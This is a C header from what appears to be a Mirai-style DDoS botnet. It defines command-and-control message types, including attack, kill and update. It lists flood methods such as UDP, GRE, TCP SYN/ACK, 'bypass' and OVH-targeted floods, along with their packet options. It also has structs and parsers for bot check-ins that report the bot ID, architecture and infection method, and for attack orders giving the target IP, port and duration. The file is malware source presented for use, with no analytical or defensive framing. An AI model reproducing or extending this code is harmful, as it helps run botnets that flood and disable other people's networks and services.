#pragma once

#include <stdint.h>
#include "utils.h"

#define MSG_TYPE_IDENTIFY 0x01
#define MSG_TYPE_ATTACK   0x02
#define MSG_TYPE_SPECIAL  0x03
#define MSG_TYPE_PING     0x04
#define MSG_TYPE_UPDATE   0x05
#define MSG_TYPE_KILL     0x06
#define MSG_TYPE_STOP     0x07

#define ATTACK_UDP        0x01
#define ATTACK_HEX        0x05
#define ATTACK_UDPRAW     0x06
#define ATTACK_UDPTHREADS 0x08
#define ATTACK_TCPRAW     0x0a
#define ATTACK_TCP_ACK    0x0b
#define ATTACK_TCP_SYN    0x0c
#define ATTACK_GRE        0x0e
#define ATTACK_UDP_GAME   0x16
#define ATTACK_TCP_STOMP  0x12
#define ATTACK_TCP_BYPASS 0x13
#define ATTACK_UDPLEGIT   0x14
#define ATTACK_OVH        0x17

#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_CONNS           9
#define ATK_OPT_TCP_ACK         13
#define ATK_OPT_TCP_SYN         14
#define ATK_OPT_TCP_PSH         15
#define ATK_OPT_TCP_RST         16
#define ATK_OPT_TCP_FIN         17
#define ATK_OPT_TCP_URG         18
#define ATK_OPT_MINECRAFT       19
#define ATK_OPT_GRE_CONSTIP     20
#define ATK_OPT_THREADS         21

struct attack_target {
    uint32_t addr;
    uint8_t netmask;
    struct sockaddr_in sock_addr;
};

struct attack_option {
    uint8_t key;
    uint8_t val_len;
    char *val;
};

#pragma pack(push, 1)
typedef struct {
    uint8_t type;
    char bot_id[64];
    char arch[16];
    char infection_method[32];
} msg_identify_t;

typedef struct {
    uint8_t type;
    uint8_t method;
    uint32_t ip;
    uint16_t port;
    uint32_t duration;
} msg_attack_t;

typedef struct {
    uint8_t type;
    uint8_t cmd_id;
} msg_special_t;
#pragma pack(pop)

static void serialize_identify(uint8_t *buffer, const char *bot_id, const char *arch, const char *infection_method) {
    msg_identify_t *msg = (msg_identify_t *)buffer;
    msg->type = MSG_TYPE_IDENTIFY;
    util_zero(msg->bot_id, 64);
    util_zero(msg->arch, 16);
    util_zero(msg->infection_method, 32);
    util_strncpy(msg->bot_id, (char *)bot_id, 63);
    util_strncpy(msg->arch, (char *)arch, 15);
    util_strncpy(msg->infection_method, (char *)infection_method, 31);
}

static int parse_identify(const uint8_t *buffer, char *bot_id, char *arch, char *infection_method) {
    const msg_identify_t *msg = (const msg_identify_t *)buffer;
    if (msg->type != MSG_TYPE_IDENTIFY) return -1;

    util_memcpy(bot_id, msg->bot_id, 64);
    bot_id[63] = '\0';
    util_memcpy(arch, msg->arch, 16);
    arch[15] = '\0';
    util_memcpy(infection_method, msg->infection_method, 32);
    infection_method[31] = '\0';
    return 0;
}

static int parse_attack(const uint8_t *buffer, uint8_t *method, uint32_t *ip, uint16_t *port, uint32_t *duration, struct attack_option **opts, uint8_t *opts_len) {
    const msg_attack_t *msg = (const msg_attack_t *)buffer;
    if (msg->type != MSG_TYPE_ATTACK) return -1;

    *method = msg->method;
    *ip = msg->ip;
    *port = ntohs(msg->port);
    *duration = ntohl(msg->duration);

    *opts_len = 0;
    *opts = NULL;

    int offset = sizeof(msg_attack_t);
    while (offset < 512) {
        uint8_t key = buffer[offset++];
        if (key == 0) break;

        uint8_t len = buffer[offset++];
        *opts = realloc(*opts, (*opts_len + 1) * sizeof(struct attack_option));
        (*opts)[*opts_len].key = key;
        (*opts)[*opts_len].val_len = len;
        (*opts)[*opts_len].val = malloc(len + 1);
        util_memcpy((*opts)[*opts_len].val, (void *)(buffer + offset), len);
        (*opts)[*opts_len].val[len] = '\0';

        offset += len;
        (*opts_len)++;
    }

    return 0;
}
